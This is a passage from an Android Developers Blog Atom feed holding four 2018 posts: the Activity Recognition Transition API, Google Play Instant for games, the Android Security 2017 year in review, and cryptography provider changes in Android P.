    <category scheme="http://www.blogger.com/atom/ns#" term="intuit"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="transition api"/>
    <title type="text">Activity Recognition’s new Transition API makes context-aware features accessible to all developers</title>
    <content type="html">&lt;meta name="twitter:image" content="https://2.bp.blogspot.com/-xjpu46Q1QlM/WrALrluMqRI/AAAAAAAAFJc/G0jP4_1B5TgBGCioG5vyIFkCrSl1zD1WwCLcBGAs/s1600/image1.png" imageanchor="1" &gt;&lt;img id="imgHalf"&gt;

&lt;em&gt;Posted by Marc Stogaitis, Tajinder Gadh, and Michael Cai, Android Activity Recognition Team&lt;/em&gt;

&lt;p&gt;
Phones are our most personal devices we bring with us everywhere, but until now it's been hard for apps to adjust their experience to a user's continually changing environment and activity. We've heard from developer after developer that they're spending valuable engineering time to combine various signals like location and sensor data just to determine when the user has started or ended an activity like walking or driving. Even worse, when apps are independently and continuously checking for changes in user activity, battery life suffers. That's why today, we're excited to make the Activity Recognition Transition API available to all Android developers - a simple API that does all the processing for you and just tells you what you actually care about: when a user's activity has changed.
&lt;/p&gt;
&lt;p&gt;
Since November of last year, the Transition API has been working behind the scenes to power the &lt;a href="https://android-developers.googleblog.com/2017/11/making-pixel-better-for-drivers.html"&gt;Driving Do-Not-Disturb&lt;/a&gt; feature launched on the Pixel 2. While it might seem simple to turn on Do-Not-Disturb when car motion is detected by the phone's sensors, many tricky challenges arise in practice. How can you tell if stillness means the user parked their car and ended a drive or simply stopped at a traffic light and will continue on? Should you trust a spike in a non-driving activity or is it a momentary classification error? With the Transition API, all Android developers can now leverage the same sets of training data and algorithmic filtering used by Google to confidently detect these changes in user activity.
&lt;/p&gt;
&lt;p&gt;
Intuit partnered with us to test the Transition API and found it an ideal solution for their &lt;a href="https://play.google.com/store/apps/details?id=com.intuit.qbse"&gt;QuickBooks Self-Employed&lt;/a&gt; app:
&lt;/p&gt;
&lt;p&gt;

    "QuickBooks Self-Employed helps self-employed workers maximize their deductions at tax time by importing transactions and automatically tracking car mileage. Before the Transition API, we created our own solution to track mileage that combined GPS, phone sensors, and other metadata, but due to the wide variability in Android devices, our algorithm wasn't 100% accurate and some users reported missing or incomplete trips. We were able to build a proof-of-concept using the Transition API in a matter of days and it has now replaced our existing solution, offering a more reliable solution that also reduced our battery consumption. The Transition API frees us up to focus our efforts on being the best possible tax solution," say Pranay Airan and Mithun Mahadevan from Intuit.
&lt;/p&gt;


&lt;a href="https://2.bp.blogspot.com/-xjpu46Q1QlM/WrALrluMqRI/AAAAAAAAFJc/G0jP4_1B5TgBGCioG5vyIFkCrSl1zD1WwCLcBGAs/s1600/image1.png" imageanchor="1" &gt;&lt;img id="imgHalf" border="0" src="https://2.bp.blogspot.com/-xjpu46Q1QlM/WrALrluMqRI/AAAAAAAAFJc/G0jP4_1B5TgBGCioG5vyIFkCrSl1zD1WwCLcBGAs/s1600/image1.png" data-original-width="506" data-original-height="900" /&gt;&lt;/a&gt;

&lt;p id="caption"&gt;Automatic mileage tracking in QuickBooks Self-Employed&lt;/p&gt;

&lt;p&gt;
&lt;a href="https://play.google.com/store/apps/details?id=com.life360.android.safetymapd"&gt;Life360&lt;/a&gt; similarly implemented the Transition API in their app with significant improvements in activity detection latency and battery consumption:
&lt;/p&gt;
&lt;p&gt;

    "With over 10 million active families, Life360 is the world's largest mobile app for families. Our mission is to become the must-have Family Membership that gives families peace of mind anytime and anywhere. Today we do that through location sharing and 24/7 safety features like monitoring driving behavior of family members, so measuring activities accurately and with minimal battery drain is critical. To determine when a user has started or finished a drive, our app previously relied on a combination of geofences, the Fused Location Provider API and the Activity Recognition API, but there were many challenges with that approach including how to quickly detect the start of the drive without excessively draining battery and interpreting the granular and rapidly changing reading from the raw Activity Recognition API. But in testing the Transition API, we are seeing higher accuracy and reduced battery drain over our previous solution, more than meeting our needs," says Dylan Keil from Life360.
&lt;/p&gt;
&lt;p&gt;

&lt;a href="https://3.bp.blogspot.com/-jDgcFj0bhIE/WrAL4t8LU6I/AAAAAAAAFJg/07cgXSIDGKoUO5RyY24JV7m0Wjce9XtcACLcBGAs/s1600/image2.png" imageanchor="1" &gt;&lt;img id="imgHalf" border="0" src="https://3.bp.blogspot.com/-jDgcFj0bhIE/WrAL4t8LU6I/AAAAAAAAFJg/07cgXSIDGKoUO5RyY24JV7m0Wjce9XtcACLcBGAs/s1600/image2.png" data-original-width="486" data-original-height="866" /&gt;&lt;/a&gt;

&lt;p id="caption"&gt;Live location sharing in Life360&lt;/p&gt;

&lt;p&gt;
In the coming months, we will continue adding new activities to the Transition API to support even more kinds of context-aware features on Android like differentiating between road and rail vehicles. If you're ready to use the Transition API in your app, check out our &lt;a target=_blank href="https://developer.android.com/guide/topics/location/transitions.html"&gt;API guide&lt;/a&gt;.
&lt;/p&gt;

&lt;style&gt;
#imgHalf {
display: block;
margin: 10px auto 0 auto;
width: 50%;
padding: 0;
}

#caption {
text-align: center;
font-size: 85%;
font-style: italic;
margin: 5px 0 10px 0;
}
&lt;/style&gt;&lt;div class="feedflare"&gt;
&lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=cOHRVmmaM-0:4HLpmfWzZbk:yIl2AUoC8zA"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?d=yIl2AUoC8zA" border="0"&gt;&lt;/img&gt;&lt;/a&gt; &lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=cOHRVmmaM-0:4HLpmfWzZbk:-BTjWOF_DHI"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?i=cOHRVmmaM-0:4HLpmfWzZbk:-BTjWOF_DHI" border="0"&gt;&lt;/img&gt;&lt;/a&gt;
&lt;/div&gt;&lt;img src="http://feeds.feedburner.com/~r/blogspot/hsDu/~4/cOHRVmmaM-0" height="1" width="1" alt=""/&gt;</content>
    <link rel="edit" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/8487264364249050843"/>
    <link rel="self" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/8487264364249050843"/>
    <link rel="alternate" type="text/html" href="http://feedproxy.google.com/~r/blogspot/hsDu/~3/cOHRVmmaM-0/activity-recognitions-new-transition.html" title="Activity Recognition’s new Transition API makes context-aware features accessible to all developers"/>
    <author>
      <name>Android Developers</name>
      <uri>http://www.blogger.com/profile/08588467489110681140</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif"/>
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://2.bp.blogspot.com/-xjpu46Q1QlM/WrALrluMqRI/AAAAAAAAFJc/G0jP4_1B5TgBGCioG5vyIFkCrSl1zD1WwCLcBGAs/s72-c/image1.png" height="72" width="72"/>
    <feedburner:origLink>http://android-developers.googleblog.com/2018/03/activity-recognitions-new-transition.html</feedburner:origLink>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-6755709643044947179.post-4241149134049747023</id>
    <published>2018-03-19T10:00:00.000-07:00</published>
    <updated>2018-03-19T14:22:03.223-07:00</updated>
    <category scheme="http://www.blogger.com/atom/ns#" term="gdc18"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="GooglePlay"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="instant"/>
    <title type="text">Our big bet on mobile games at Game Developers Conference 2018</title>
    <content type="html">&lt;meta name="twitter:image" content="https://4.bp.blogspot.com/-Q9-baw4w8GY/WrAp5ZJYHrI/AAAAAAAAFJ0/OXrUR6U1a28xbDRCBIXyHDtBgX2CCmVuACLcBGAs/s1600/maxresdefault%2B%25288%2529.jpg"&gt;

&lt;em&gt;Posted by Benjamin Frenkel, Product Manager, Google Play Instant &lt;/em&gt;

&lt;p&gt;
We've been working hard to make Google Play the premier platform for game discovery and a place for you to grow your business. In the last year, the number of Android users who installed a game has more than doubled. Nearly 40% of that growth came from emerging markets, including Brazil, India, Indonesia and Mexico. Our investments extend beyond the Play Store and include many key Google products:
&lt;/p&gt;&lt;ul&gt;

&lt;li&gt;Last week, we introduced a gaming solution from &lt;strong&gt;&lt;a href="https://maps-apis.googleblog.com/2018/03/the-real-world-as-your-playground-build.html"&gt;Google Maps APIs&lt;/a&gt;&lt;/strong&gt; that enables you to build game worlds based on real world data to find the best places for gameplay. 
&lt;li&gt;We also launched &lt;strong&gt;&lt;a href="https://cloudplatform.googleblog.com/2018/03/introducing-Agones-open-source-multiplayer-dedicated-game-server-hosting-built-on-Kubernetes.html"&gt;Agones&lt;/a&gt;&lt;/strong&gt;, an open source, dedicated game server hosting product built on Google Cloud Platform, in collaboration with Ubisoft, to support multiplayer games. 
&lt;li&gt;At last month's Mobile World Congress, we released &lt;strong&gt;&lt;a href="https://developers.googleblog.com/2018/02/announcing-arcore-10-and-new-updates-to.html"&gt;version 1.0 of ARCore&lt;/a&gt;&lt;/strong&gt;, our augmented reality SDK for Android, enabling you to publish AR apps and games to Google Play for the first time and reach 100M devices across the Android ecosystem. 
&lt;li&gt;Over the next few months, we'll roll out a beta for &lt;strong&gt;&lt;a href="https://adwords.googleblog.com/"&gt;click-to-play video ads on Google Play&lt;/a&gt;&lt;/strong&gt;—a new way to reach players with sight, sound and motion. These placements will help you showcase your games.&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;
Today, during our annual Google Developer Day at the Game Developers Conference, we introduced new tools and platforms to improve the overall game discovery on Google Play and give you more ways to deliver engaging player experiences.
&lt;/p&gt;
&lt;h2&gt;Introducing Google Play Instant&lt;/h2&gt;


&lt;p&gt;
With all the great games available on Google Play, we want to make discovery easier and remove friction during the install process. Installing and opening a game takes time and results in many players never getting to experience your game. We're thrilled to announce that instant apps is now available for games. 
&lt;/p&gt;
&lt;p&gt;
This means that with a tap, players can try a game without having to download it first. Games available instantly today include: &lt;a href="https://play.google.com/store/apps/details?id=com.supercell.clashroyale"&gt;Clash Royale&lt;/a&gt;, &lt;a href="https://play.google.com/store/apps/details?id=com.zynga.words3"&gt;Words with Friends 2&lt;/a&gt;, and &lt;a href="https://play.google.com/store/apps/details?id=com.king.bubblewitch3"&gt;Bubble Witch 3 Saga&lt;/a&gt;, and other titles from Playtika, MZ, Jam City, and Hothead Games. 
&lt;/p&gt;
&lt;center&gt;
&lt;iframe width="560" height="315" src="https://www.youtube.com/embed/u_STBSPQxYA" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen&gt;&lt;/iframe&gt;
&lt;/center&gt;
&lt;p&gt;
 
&lt;/p&gt;
&lt;p&gt;
We're calling this new experience &lt;em&gt;Google Play Instant&lt;/em&gt;.&lt;strong&gt; &lt;/strong&gt;To try it out, simply launch the Google Play Store on your Android device and visit the &lt;a href="http://g.co/play/instant"&gt;Instant Gameplay collection&lt;/a&gt;. Or, you can visit the "Arcade" in our redesigned &lt;a href="https://play.google.com/store/apps/details?id=com.google.android.play.games"&gt;Google Play Games app&lt;/a&gt; and launch any of the "Instant Gameplay" collection games. Google Play Instant makes it easier to have your players invite their friends to try out games right away through social invites and lets you share games through marketing campaigns.
&lt;/p&gt;
&lt;p&gt;
Google Play Instant is still in closed beta and we look forward to opening it more broadly later this year. It provides a collection of extensions to the instant apps framework that better support the needs of game developers; including a higher APK size limit to 10MB, progressive download support for executable code and game assets, and support for NDK and game engines using existing tool chains. We're also working with popular game development platform Unity, and others including Cocos, to add IDE support making it easy for developers to build instant apps. Developers can &lt;a href="http://g.co/play/instantbeta"&gt;sign up for more information about Google Play Instant&lt;/a&gt; as it becomes available.
&lt;/p&gt;
&lt;p&gt;
Discover insights from game &lt;a href="https://developer.android.com/stories/instant-apps.html"&gt;developers who have successfully benefited from Google Play Instant&lt;/a&gt;. Read how Zynga, King, Hothead Games, Jam City, Playtika, MZ and Magma Mobile successfully used instant apps to acquire new users, improve retention, and effectively cross-promote their games.
&lt;/p&gt;
&lt;h2&gt;Google Play Console tools to build high quality games&lt;/h2&gt;


&lt;p&gt;
We also added some useful tools to the Play Console to help you build great games, including:
&lt;/p&gt;&lt;ul&gt;

&lt;li&gt;A new &lt;strong&gt;internal testing track&lt;/strong&gt; that will allow you to quickly test and iterate on new games and features. The track is additional to the alpha and beta testing tracks, and makes your game available for up to 100 testers within seconds. 
&lt;li&gt;&lt;strong&gt;Demo loops &lt;/strong&gt;for the pre-launch report, a new feature that lets you&lt;span style="color:#222222;"&gt; predefine a likely series of actions in a game and have this "loop" run on on live devices in the Test Lab (bypassing the robo crawler).&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;
This is just the start of what we have planned for 2018. We can't wait to see Google Play Instant bring new audiences to your games.
&lt;/p&gt;

&lt;style&gt;
h2 {
font-size: 130%;
}
&lt;/style&gt;&lt;div class="feedflare"&gt;
&lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=9icd6L53JsM:cQ4DBGC25hc:yIl2AUoC8zA"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?d=yIl2AUoC8zA" border="0"&gt;&lt;/img&gt;&lt;/a&gt; &lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=9icd6L53JsM:cQ4DBGC25hc:-BTjWOF_DHI"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?i=9icd6L53JsM:cQ4DBGC25hc:-BTjWOF_DHI" border="0"&gt;&lt;/img&gt;&lt;/a&gt;
&lt;/div&gt;&lt;img src="http://feeds.feedburner.com/~r/blogspot/hsDu/~4/9icd6L53JsM" height="1" width="1" alt=""/&gt;</content>
    <link rel="edit" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/4241149134049747023"/>
    <link rel="self" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/4241149134049747023"/>
    <link rel="alternate" type="text/html" href="http://feedproxy.google.com/~r/blogspot/hsDu/~3/9icd6L53JsM/our-big-bet-on-mobile-games-at-game.html" title="Our big bet on mobile games at Game Developers Conference 2018"/>
    <author>
      <name>Android Developers</name>
      <uri>http://www.blogger.com/profile/08588467489110681140</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif"/>
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://img.youtube.com/vi/u_STBSPQxYA/default.jpg" height="72" width="72"/>
    <feedburner:origLink>http://android-developers.googleblog.com/2018/03/our-big-bet-on-mobile-games-at-game.html</feedburner:origLink>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-6755709643044947179.post-5918620684708470497</id>
    <published>2018-03-15T13:12:00.001-07:00</published>
    <updated>2018-03-15T13:13:05.808-07:00</updated>
    <category scheme="http://www.blogger.com/atom/ns#" term="android security"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="google security"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Security"/>
    <title type="text">Android Security 2017 Year in Review</title>
    <content type="html">&lt;em&gt;Originally posted by Dave Kleidermacher, Vice President of Security for Android, Play, ChromeOS, on the &lt;a href="https://security.googleblog.com/2018/03/android-security-2017-year-in-review.html" target=_blank&gt;Google Security Blog&lt;/a&gt;&lt;/em&gt;

&lt;p&gt;
Our team's goal is simple: secure more than two billion Android devices. It's our entire focus, and we're constantly working to improve our protections to keep users safe.
&lt;/p&gt;
&lt;p&gt;
Today, we're releasing our fourth annual Android security year in review. We compile these reports to help educate the public about the many different layers of Android security, and also to hold ourselves accountable so that anyone can track our security work over time.
&lt;/p&gt;
&lt;p&gt;
We saw some really positive momentum last year and this post includes some, but not nearly all, of the major moments from 2017. To dive into all the details, you can read the full report at: &lt;a target=_blank href="https://source.android.com/security/reports/Google_Android_Security_2017_Report_Final.pdf"&gt;g.co/AndroidSecurityReport2017&lt;/a&gt;
&lt;/p&gt;
&lt;h2&gt;Google Play Protect&lt;/h2&gt;

&lt;p&gt;
In May, we &lt;a href="https://blog.google/products/android/google-play-protect/"&gt;announced&lt;/a&gt; Google Play Protect, a new home for the suite of Android security services on nearly two billion devices. While many of Play Protect's features had been securing Android devices for years, we wanted to make these more visible to help assure people that our security protections are constantly working to keep them safe.
&lt;/p&gt;
&lt;p&gt;
Play Protect's core objective is to shield users from &lt;a href="https://source.android.com/security/reports/Google_Android_Security_PHA_classifications.pdf"&gt;Potentially Harmful Apps&lt;/a&gt;, or PHAs. Every day, it automatically reviews more than 50 billion apps, other potential sources of PHAs, and devices themselves and takes action when it finds any.
&lt;/p&gt;
&lt;p&gt;
Play Protect uses a variety of different tactics to keep users and their data safe, but the impact of machine learning is already quite significant: 60.3% of all Potentially Harmful Apps were detected via machine learning, and we expect this to increase in the future.
&lt;/p&gt;

&lt;a href="https://2.bp.blogspot.com/-sJnYSaQFC1U/WqqOQ5t-_7I/AAAAAAAAFIk/HOq6QjjUXqA_nIEibD5J3uxgh9nW0k5ZgCLcBGAs/s1600/image1.gif" imageanchor="1" &gt;&lt;img id="imgHalf" border="0" src="https://2.bp.blogspot.com/-sJnYSaQFC1U/WqqOQ5t-_7I/AAAAAAAAFIk/HOq6QjjUXqA_nIEibD5J3uxgh9nW0k5ZgCLcBGAs/s1600/image1.gif" data-original-width="700" data-original-height="1120" /&gt;&lt;/a&gt;


&lt;h3&gt;Protecting users' devices&lt;/h3&gt;


&lt;p&gt;
Play Protect automatically checks Android devices for PHAs at least once every day, and users can conduct an additional review at any time for some extra peace of mind. These automatic reviews enabled us to remove nearly 39 million PHAs last year.
&lt;/p&gt;
&lt;p&gt;
We also update Play Protect to respond to trends that we detect across the ecosystem. For instance, we recognized that nearly 35% of new PHA installations were occurring when a device was offline or had lost network connectivity. As a result, in October 2017, we enabled offline scanning in Play Protect, and have since prevented 10 million more PHA installs. 
&lt;/p&gt;
&lt;h3&gt;Preventing PHA downloads&lt;/h3&gt;


&lt;p&gt;
Devices that downloaded apps exclusively from Google Play were nine times less likely to get a PHA than devices that downloaded apps from other sources. And these security protections continue to improve, partially because of Play Protect's increased visibility into newly submitted apps to Play. It reviewed 65% more Play apps compared to 2016.
&lt;/p&gt;
&lt;p&gt;
Play Protect also doesn't just secure Google Play—it helps protect the broader Android ecosystem as well. Thanks in large part to Play Protect, the installation rates of PHAs from outside of Google Play dropped by more than 60%.
&lt;/p&gt;
&lt;h2&gt;Security updates&lt;/h2&gt;

&lt;a href="https://1.bp.blogspot.com/-jBlMY3T3dqg/WqrN2mBYQeI/AAAAAAAAFJE/RhQKeThl8iEMfsVJ1bIZ18vIjtrZdVoBQCLcBGAs/s1600/XuOrVkMtzmo.png" imageanchor="1" &gt;&lt;img id="floatRight" border="0" src="https://1.bp.blogspot.com/-jBlMY3T3dqg/WqrN2mBYQeI/AAAAAAAAFJE/RhQKeThl8iEMfsVJ1bIZ18vIjtrZdVoBQCLcBGAs/s1600/XuOrVkMtzmo.png" data-original-width="1060" data-original-height="987" /&gt;&lt;/a&gt;

&lt;p&gt;
While Google Play Protect is a great shield against harmful PHAs, we also partner with device manufacturers to make sure that the version of Android running on user devices is up-to-date and secure.
&lt;/p&gt;
&lt;p&gt;
Throughout the year, we worked to improve the process for releasing security updates, and 30% more devices received security patches than in 2016. Furthermore, no critical security vulnerabilities affecting the Android platform were publicly disclosed without an update or mitigation available for Android devices. This was possible due to the &lt;a href="https://www.google.com/about/appsecurity/android-rewards/"&gt;Android Security Rewards Program&lt;/a&gt;, enhanced collaboration with the &lt;a href="https://source.android.com/security/overview/acknowledgements"&gt;security researcher community&lt;/a&gt;, coordination with industry partners, and built-in security features of the Android platform.
&lt;/p&gt;
&lt;h2&gt;New security features in Android Oreo&lt;/h2&gt;


&lt;p&gt;
We introduced a slew of new security features in Android Oreo: &lt;a href="https://android-developers.googleblog.com/2017/08/making-it-safer-to-get-apps-on-android-o.html"&gt;making it safer to get apps&lt;/a&gt;, dropping &lt;a href="https://android-developers.googleblog.com/2017/04/android-o-to-drop-insecure-tls-version.html"&gt;insecure network protocols&lt;/a&gt;, providing more &lt;a href="https://android-developers.googleblog.com/2017/04/changes-to-device-identifiers-in.html"&gt;user control over identifiers&lt;/a&gt;, &lt;a href="https://android-developers.googleblog.com/2017/08/hardening-kernel-in-android-oreo.html"&gt;hardening the kernel&lt;/a&gt;, and more.
&lt;/p&gt;
&lt;p&gt;
We highlighted many of these over the course of the year, but some may have flown under the radar. For example, we updated the overlay API so that apps can no longer block the entire screen and prevent you from dismissing them, a common tactic employed by ransomware.
&lt;/p&gt;
&lt;h2&gt;Openness makes Android security stronger&lt;/h2&gt;


&lt;p&gt;
We've long said it, but it remains truer than ever: Android's openness helps strengthen our security protections. For years, the Android ecosystem has benefitted from researchers' findings, and 2017 was no different. 
&lt;/p&gt;
&lt;h3&gt;Security reward programs&lt;/h3&gt;


&lt;p&gt;
We continued to see great momentum with our Android Security Rewards program: we paid researchers $1.28 million, totalling more than two million dollars since the start of the program. We also &lt;a href="https://android-developers.googleblog.com/2017/06/2017-android-security-rewards.html"&gt;increased our top-line payouts&lt;/a&gt; for exploits that compromise TrustZone or Verified Boot from $50,000 to $200,000, and remote kernel exploits from $30,000 to $150,000.
&lt;/p&gt;

&lt;a href="https://4.bp.blogspot.com/-RiC1_0C_T8I/WqrOQy_TlCI/AAAAAAAAFJI/7pFv1XHV5Y0Lonc8FbiG56DLtRwp5jbzwCLcBGAs/s1600/download.png" imageanchor="1" &gt;&lt;img id="imgFull" border="0" src="https://4.bp.blogspot.com/-RiC1_0C_T8I/WqrOQy_TlCI/AAAAAAAAFJI/7pFv1XHV5Y0Lonc8FbiG56DLtRwp5jbzwCLcBGAs/s1600/download.png" data-original-width="1218" data-original-height="480" /&gt;&lt;/a&gt;

&lt;p&gt;
In parallel, we also introduced &lt;a href="https://www.google.com/about/appsecurity/play-rewards/index.html"&gt;Google Play Security Rewards program&lt;/a&gt; and offered a bonus bounty to developers that discover and disclose select critical vulnerabilities in apps hosted on Play to their developers. 
&lt;/p&gt;
&lt;h3&gt;External security competitions&lt;/h3&gt;


&lt;p&gt;
Our teams also participated in external vulnerability discovery and disclosure competitions, such as &lt;a href="https://www.thezdi.com/blog/2017/11/2/the-results-mobile-pwn2own-2017-day-two"&gt;Mobile Pwn2Own&lt;/a&gt;. At the 2017 Mobile Pwn2Own competition, no exploits successfully compromised the Google Pixel. And of the exploits demonstrated against devices running Android, none could be reproduced on a device running unmodified Android source code from the &lt;a href="https://source.android.com/"&gt;Android Open Source Project&lt;/a&gt; (AOSP).
&lt;/p&gt;
&lt;p&gt;
We're pleased to see the positive momentum behind Android security, and we'll continue our work to improve our protections this year, and beyond. We will never stop our work to ensure the security of Android users.
&lt;/p&gt;

&lt;style&gt;
#imgHalf {
display: block;
width: 50%;
margin: 10px auto;
}

h2 {
font-size: 130%;
margin-bottom: 0;
}

h3 {
font-size: 105%;
margin-bottom: 0;
}

#floatRight {
float: right;
width: 60%;
margin: 0;
padding: 0;
}

#imgFull {
width: 100%;
margin: 10px 0;
padding: 0;
}


&lt;/style&gt;&lt;div class="feedflare"&gt;
&lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=zsdCc0NP5Ws:uCJeUmHeelE:yIl2AUoC8zA"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?d=yIl2AUoC8zA" border="0"&gt;&lt;/img&gt;&lt;/a&gt; &lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=zsdCc0NP5Ws:uCJeUmHeelE:-BTjWOF_DHI"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?i=zsdCc0NP5Ws:uCJeUmHeelE:-BTjWOF_DHI" border="0"&gt;&lt;/img&gt;&lt;/a&gt;
&lt;/div&gt;&lt;img src="http://feeds.feedburner.com/~r/blogspot/hsDu/~4/zsdCc0NP5Ws" height="1" width="1" alt=""/&gt;</content>
    <link rel="edit" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/5918620684708470497"/>
    <link rel="self" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/5918620684708470497"/>
    <link rel="alternate" type="text/html" href="http://feedproxy.google.com/~r/blogspot/hsDu/~3/zsdCc0NP5Ws/android-security-2017-year-in-review.html" title="Android Security 2017 Year in Review"/>
    <author>
      <name>Android Developers</name>
      <uri>http://www.blogger.com/profile/08588467489110681140</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif"/>
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://2.bp.blogspot.com/-sJnYSaQFC1U/WqqOQ5t-_7I/AAAAAAAAFIk/HOq6QjjUXqA_nIEibD5J3uxgh9nW0k5ZgCLcBGAs/s72-c/image1.gif" height="72" width="72"/>
    <feedburner:origLink>http://android-developers.googleblog.com/2018/03/android-security-2017-year-in-review.html</feedburner:origLink>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-6755709643044947179.post-1785071729179673600</id>
    <published>2018-03-08T09:00:00.000-08:00</published>
    <updated>2018-03-08T09:25:27.676-08:00</updated>
    <category scheme="http://www.blogger.com/atom/ns#" term="android p"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Design"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Develop"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Featured"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Google Play"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Security"/>
    <title type="text">Cryptography Changes in Android P</title>
    <content type="html">&lt;meta name="twitter:image" content="https://3.bp.blogspot.com/-yjp7X2zK0S8/Wp2Atb3uzgI/AAAAAAAAFHY/C89cA9g_K9gMAAyGw3Q9R9DbfXWqQYcLQCLcBGAs/s1600/image7.png"&gt;



&lt;em&gt;Posted by Adam Vartanian, Software Engineer&lt;/em&gt;

&lt;p&gt;
We hope you're enjoying the first developer preview of Android P.  We wanted to specifically call out some backward-incompatible changes we plan to make to the cryptographic capabilities in Android P, which you can see in the developer preview.
&lt;/p&gt;
&lt;h3&gt;Changes to providers&lt;/h3&gt;


&lt;p&gt;
Starting in Android P, we plan to deprecate some functionality from the BC provider that's duplicated by the AndroidOpenSSL (also known as Conscrypt) provider.  This will only affect applications that specify the BC provider explicitly when calling &lt;code&gt;getInstance()&lt;/code&gt; methods.  To be clear, we aren't doing this because we are concerned about the security of the implementations from the BC provider, rather because having duplicated functionality imposes additional costs and risks while not providing much benefit.
&lt;/p&gt;
&lt;p&gt;
If you don't specify a provider in your &lt;code&gt;getInstance()&lt;/code&gt; calls, no changes are required.
&lt;/p&gt;
&lt;p&gt;
If you specify the provider by name or by instance—for example, &lt;code&gt;Cipher.getInstance("AES/CBC/PKCS7PADDING", "BC")&lt;/code&gt; or &lt;code&gt;Cipher.getInstance("AES/CBC/PKCS7PADDING", Security.getProvider("BC"))&lt;/code&gt;—the behavior you get in Android P will depend on what API level your application targets.  For apps targeting an API level before P, the call will return the BC implementation and log a warning in the application log.  For apps targeting Android P or later, the call will throw &lt;code&gt;NoSuchAlgorithmException&lt;/code&gt;.
&lt;/p&gt;
&lt;p&gt;
To resolve this, you should stop specifying a provider and use the default implementation.
&lt;/p&gt;
&lt;p&gt;
In a later Android release, we plan to remove the deprecated functionality from the BC provider entirely.  Once removed, any call that requests that functionality from the BC provider (whether by name or instance) will throw &lt;code&gt;NoSuchAlgorithmException&lt;/code&gt;.
&lt;/p&gt;
&lt;h3&gt;Removal of the Crypto provider&lt;/h3&gt;


&lt;p&gt;
In a &lt;a href="https://android-developers.googleblog.com/2016/06/security-crypto-provider-deprecated-in.html"&gt;previous post&lt;/a&gt;, we announced that the Crypto provider was deprecated beginning in Android Nougat.  Since then, any request for the Crypto provider by an application targeting API 23 (Marshmallow) or before would succeed, but requests by applications targeting API 24 (Nougat) or later would fail.  In Android P, we plan to remove the Crypto provider entirely.  Once removed, any call to &lt;code&gt;SecureRandom.getInstance("SHA1PRNG", "Crypto")&lt;/code&gt; will throw &lt;code&gt;NoSuchProviderException&lt;/code&gt;.  Please ensure your apps have been updated.
&lt;/p&gt;&lt;div class="feedflare"&gt;
&lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=a9_AtgX7o-U:DVO7-vFOaGk:yIl2AUoC8zA"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?d=yIl2AUoC8zA" border="0"&gt;&lt;/img&gt;&lt;/a&gt; &lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=a9_AtgX7o-U:DVO7-vFOaGk:-BTjWOF_DHI"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?i=a9_AtgX7o-U:DVO7-vFOaGk:-BTjWOF_DHI" border="0"&gt;&lt;/img&gt;&lt;/a&gt;
&lt;/div&gt;&lt;img src="http://feeds.feedburner.com/~r/blogspot/hsDu/~4/a9_AtgX7o-U" height="1" width="1" alt=""/&gt;</content>
    <link rel="edit" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/1785071729179673600"/>
    <link rel="self" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/1785071729179673600"/>
    <link rel="alternate" type="text/html" href="http://feedproxy.google.com/~r/blogspot/hsDu/~3/a9_AtgX7o-U/cryptography-changes-in-android-p.html" title="Cryptography Changes in Android P"/>
    <author>
      <name>Android Developers</name>
      <uri>http://www.blogger.com/profile/08588467489110681140</uri>
      <email>noreply@blogger.com</email>
